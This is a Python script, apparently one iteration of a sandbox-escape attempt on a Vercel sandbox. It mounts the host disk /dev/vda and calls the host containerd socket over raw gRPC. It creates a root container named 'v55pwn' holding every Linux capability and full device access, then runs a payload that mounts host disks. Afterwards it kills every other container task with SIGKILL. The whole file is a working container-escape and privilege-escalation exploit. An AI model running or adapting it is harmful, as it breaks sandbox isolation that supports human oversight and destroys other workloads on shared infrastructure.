# -*- coding: utf-8 -*-
"""vda55: 容器 payload 执行状态诊断 (v54 发现容器 payload 无输出)
在 kill 前收集: ps 进程视图 / 容器 mountinfo / vda 上 payload 输出 / share 目录
"""
import os, time, socket, ctypes, re, struct, subprocess, json

OUT = '/vercel/sandbox/v55m.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')
EXTRA = '/mnt/vdax/root/v55m.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    try:
        open(EXTRA, 'a', encoding='utf-8', errors='replace').write(line + '\n')
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, t=6, ns='default'):
    try:
        tmp = '/vercel/sandbox/curl_req.bin'
        hdr = '/vercel/sandbox/curl_hdr.txt'
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: application/grpc', '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 2)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' ')[:200]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload


# ---- 容器 payload: 只做日志多通道 + 轮询打 snap, 由 guest 侧诊断 ----
PAYLOAD = r'''# -*- coding: utf-8 -*-
import socket, time, os, threading, struct, subprocess, re
def wlog(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in ['/mnt/volumes/run/vercel/share/v55c.out', '/mnt/run/vercel/share/v55c.out',
              '/mnt/g/vercel/sandbox/v55c.out', '/mnt/root/v55c.out', '/vercel/sandbox/v55c.out']:
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass
def main():
    wlog('payload start pid=%d' % os.getpid())
    try:
        r = subprocess.run(['mount', '/dev/vdb', '/mnt/g2'], capture_output=True)
        wlog('mount vdb /mnt/g2 rc=%d err=%s' % (r.returncode, r.stderr[:120]))
    except Exception as e:
        wlog('mount vdb EXC %s' % e)
    try:
        r = subprocess.run(['mount', '/dev/vda', '/mnt/v2'], capture_output=True)
        wlog('mount vda /mnt/v2 rc=%d err=%s' % (r.returncode, r.stderr[:120]))
    except Exception as e:
        wlog('mount vda EXC %s' % e)
    for p in ['/mnt/g/vercel/sandbox', '/mnt/volumes/run/vercel/share', '/mnt/run/vercel/share']:
        wlog('chk %s -> %s' % (p, os.path.isdir(p)))
    try:
        mnt = open('/proc/self/mountinfo').read()
        wlog('mountinfo: %s' % mnt.replace('\n', ' | ')[:1500])
    except Exception as e:
        wlog('mountinfo EXC %s' % e)
    wlog('V55C_STARTED')
main()
'''
HOST_PS = '''ps -ef 2>&1 | head -60; echo ===GREP===; ps -ef 2>&1 | grep -E "v55_payload|v55pwn|payload" | grep -v grep; echo ===FDS===; for p in $(ps -ef | grep v55_payload | grep -v grep | awk '{print $2}'); do echo PID=$p; ls -la /proc/$p/fd/ 2>&1 | head -15; cat /proc/$p/mountinfo 2>/dev/null | head -30; done'''


def diag(sbx_cid, label):
    log('===== DIAG %s =====' % label)
    try:
        r = subprocess.run(['sh', '-c', HOST_PS], capture_output=True, timeout=15)
        log('ps out:\n%s' % r.stdout.decode(errors='replace')[:3000])
    except Exception as e:
        log('ps EXC %s' % e)
    try:
        log('v55c.out on vda: %s' % (open('/mnt/vdax/root/v55c.out', errors='replace').read()[:1000] if os.path.exists('/mnt/vdax/root/v55c.out') else 'NOT FOUND'))
    except Exception as e:
        log('v55c read EXC %s' % e)
    try:
        share = '/mnt/vdax/volumes/run/vercel/share'
        log('host share ls: %s' % (sorted(os.listdir(share)) if os.path.isdir(share) else 'NO DIR'))
        if os.path.exists(share + '/v55c.out'):
            log('host share v55c: %s' % open(share + '/v55c.out', errors='replace').read()[:1000])
    except Exception as e:
        log('share EXC %s' % e)
    try:
        tdir = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/%s' % sbx_cid
        log('task dir: %s' % (sorted(os.listdir(tdir)) if os.path.isdir(tdir) else 'NO TASK DIR'))
    except Exception as e:
        log('tdir EXC %s' % e)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount vda ret=%d' % ret)

    CSP = '/mnt/vdax/run/containerd/containerd.sock'
    IMAGE = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    CID = 'v55pwn'

    pf = '/mnt/vdax/root/v55_payload.py'
    try:
        open(pf, 'w').write(PAYLOAD)
        log('payload written %d bytes' % len(PAYLOAD))
    except Exception as e:
        log('payload write ERR %s' % e)

    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    m = re.search(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}-snapshot', out or b'')
    sk = m.group().decode() if m else None
    log('list %s snap_key=%s' % (rc, sk))

    caps = ["CAP_AUDIT_CONTROL", "CAP_AUDIT_READ", "CAP_AUDIT_WRITE", "CAP_BLOCK_SUSPEND", "CAP_BPF",
            "CAP_CHECKPOINT_RESTORE", "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
            "CAP_FSETID", "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_KILL", "CAP_LEASE", "CAP_LINUX_IMMUTABLE",
            "CAP_MAC_ADMIN", "CAP_MAC_OVERRIDE", "CAP_MKNOD", "CAP_NET_ADMIN", "CAP_NET_BIND_SERVICE",
            "CAP_NET_BROADCAST", "CAP_NET_RAW", "CAP_PERFMON", "CAP_SETFCAP", "CAP_SETGID", "CAP_SETPCAP",
            "CAP_SETUID", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_CHROOT", "CAP_SYS_MODULE", "CAP_SYS_NICE",
            "CAP_SYS_PACCT", "CAP_SYS_PTRACE", "CAP_SYS_RAWIO", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
            "CAP_SYS_TTY_CONFIG", "CAP_SYSLOG", "CAP_WAKE_ALARM"]
    spec = {
        "ociVersion": "1.0.2",
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": ["/bin/sh", "-c",
                     "mkdir -p /mnt; mount /dev/vda /mnt 2>/dev/null; "
                     "mkdir -p /mnt/g; mount /dev/vdb /mnt/g 2>/dev/null; "
                     "python3 /mnt/root/v55_payload.py; sleep 99999"],
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
            "cwd": "/",
            "capabilities": {"bounding": caps, "effective": caps, "permitted": caps, "ambient": caps}
        },
        "root": {"path": "rootfs"},
        "mounts": [
            {"destination": "/proc", "type": "proc", "source": "proc"},
            {"destination": "/dev", "type": "bind", "source": "/dev", "options": ["rbind", "rw"]},
            {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["rbind", "ro"]},
            {"destination": "/usr", "type": "bind", "source": "/usr", "options": ["rbind", "ro"]},
            {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["rbind", "ro"]},
            {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["rbind", "ro"]},
            {"destination": "/etc", "type": "bind", "source": "/etc", "options": ["rbind", "ro"]}
        ],
        "linux": {
            "resources": {"devices": [{"allow": True, "access": "rwm"}]},
            "cgroupsPath": "/v55pwn-ctr",
            "namespaces": [{"type": "mount"}, {"type": "pid"}, {"type": "uts"}, {"type": "ipc"}]
        }
    }
    spec_json = json.dumps(spec).encode()
    runtime = pstr(1, 'io.containerd.runc.v2')
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, spec_json)
    ctr = pstr(1, CID) + pstr(3, IMAGE) + pmsg(4, runtime) + pmsg(5, any_spec) + pstr(6, 'overlayfs')
    if sk:
        ctr += pstr(7, sk)
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Create', grpc_env(pmsg(1, ctr)), t=8)
    log('Create %s out=%r' % (rc, out[:200]))
    ok = 'grpc-status: 0' in rc
    if ok:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(pstr(1, CID)), t=10)
        log('Tasks/Create %s out=%r' % (rc, out[:200]))
        ok = 'grpc-status: 0' in rc
    if ok:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(pstr(1, CID)), t=10)
        log('Tasks/Start %s out=%r' % (rc, out[:150]))

    time.sleep(3)
    try:
        tdir = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/%s' % CID
        fp = os.path.join(tdir, 'init.pid')
        if os.path.exists(fp):
            log('init.pid: %s' % open(fp).read().strip())
    except Exception as e:
        log('task dir ERR %s' % e)
    diag(CID, 'AFTER_START_3s')

    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
    targets = []
    try:
        for d in sorted(os.listdir(base)):
            if d != CID:
                targets.append(d)
    except Exception as e:
        log('list task ERR %s' % e)
    log('kill targets: %s' % targets)
    for cid in targets:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Kill',
                          grpc_env(pstr(1, cid) + pvarint(3 << 3 | 0) + pvarint(9)), t=4)
        log('kill %s %s' % (cid, rc))
    log('V55M_DONE')
    f.close()


if __name__ == '__main__':
    main()
